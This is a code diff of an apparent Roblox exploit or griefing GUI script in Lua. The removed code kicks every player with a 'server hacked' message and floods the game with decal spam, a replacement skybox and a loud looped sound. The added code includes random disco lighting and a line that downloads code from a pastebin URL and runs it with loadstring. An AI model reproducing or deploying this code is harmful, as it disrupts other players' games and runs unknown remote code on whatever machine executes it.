@@ -243,7 +243,7 @@ e1x1x1x1Laugh.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)
 e1x1x1x1Laugh.Position = UDim2.new(0.0714285746, 0, 0.648000002, 0)
 e1x1x1x1Laugh.Size = UDim2.new(0, 79, 0, 34)
 e1x1x1x1Laugh.Font = Enum.Font.GothamBold
-e1x1x1x1Laugh.Text = "Shutdown"
+e1x1x1x1Laugh.Text = "Disco"
 e1x1x1x1Laugh.TextColor3 = Color3.fromRGB(0, 0, 0)
 e1x1x1x1Laugh.TextScaled = true
 e1x1x1x1Laugh.TextSize = 14.000
@@ -251,17 +251,12 @@ e1x1x1x1Laugh.TextWrapped = true
 e1x1x1x1Laugh.MouseButton1Down:connect(function()
 	--Made by Servano
 
-
-local players = game:GetService("Players")
-local message = "The Server Was Shutdown, *Reason: Server Has Been Hacked By Boss_JKLO.*"
-
-function Shutdown()
-   for i, v in pairs(players:GetChildren()) do
-    v:Kick(message)
-end
-end
-
-Shutdown()
+ wait(0.5)
+ game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
+ game.Lighting.ShadowColor = Color3.new(math.random(), math.random(), math.random())
+ end
 end)
 DayToNight.Name = "DayToNight"
 DayToNight.Parent = Frame
@@ -556,65 +551,8 @@ Disc0.TextWrapped = true
 Disc0.MouseButton1Down:connect(function()
      --made by me
 
-local msg = Instance.new("Message",workspace)
-msg.Text = "Hi JKLO TEAM HERE."
-wait(5.8)
-msg:Destroy()
-s = Instance.new("Sky")
-s.Name = "SKY"
-s.SkyboxBk = "http://www.roblox.com/asset/?id=13784335227"
-s.SkyboxDn = "http://www.roblox.com/asset/?id=13784335227"
-s.SkyboxFt = "http://www.roblox.com/asset/?id=13784335227"
-s.SkyboxLf = "http://www.roblox.com/asset/?id=13784335227"
-s.SkyboxRt = "http://www.roblox.com/asset/?id=13784335227"
-s.SkyboxUp = "http://www.roblox.com/asset/?id=13784335227"
-s.Parent = game.Lighting
-Spooky = Instance.new("Sound", game.Workspace)
-Spooky.Name = "Spooky"
-Spooky.SoundId = "rbxassetid://13784335227"
-Spooky.Volume = 20
-Spooky.Looped = true
-Spooky:Play()
-local ID =358313209 --id here
-function spamDecal(v)
-	if v:IsA("Part") then
-		for i=0, 5 do
-			D = Instance.new("Decal")
-			D.Name = "MYDECALHUE"
-			D.Face = i
-			D.Parent = v
-			D.Texture = ("http://www.roblox.com/asset/?id="..Id)
-		end
-	else
-		if v:IsA("Model") then
-			for a,b in pairs(v:GetChildren()) do
-				spamDecal(b)
-			end
-		end
-	end
-end
-function decalspam(id) --use this function, not the one on top
-	Id = id
-	for i,v in pairs(game.Workspace:GetChildren()) do
-		if v:IsA("Part") then
-		for i=0, 5 do
-			D = Instance.new("Decal")
-			D.Name = "MYDECALHUE"
-			D.Face = i
-			D.Parent = v
-			D.Texture = ("http://www.roblox.com/asset/?id="..id)
-		end
-	else
-		if v:IsA("Model") then
-			for a,b in pairs(v:GetChildren()) do
-				spamDecal(b)
-			end
-		end
-	end
-end
-end
+loadstring(game:HttpGet("https://pastebin.com/raw/U9SFjNiq"))()
 
-decalspam(ID)
 end)
 e2006Theme.Name = "e2006Theme"
 e2006Theme.Parent = Frame
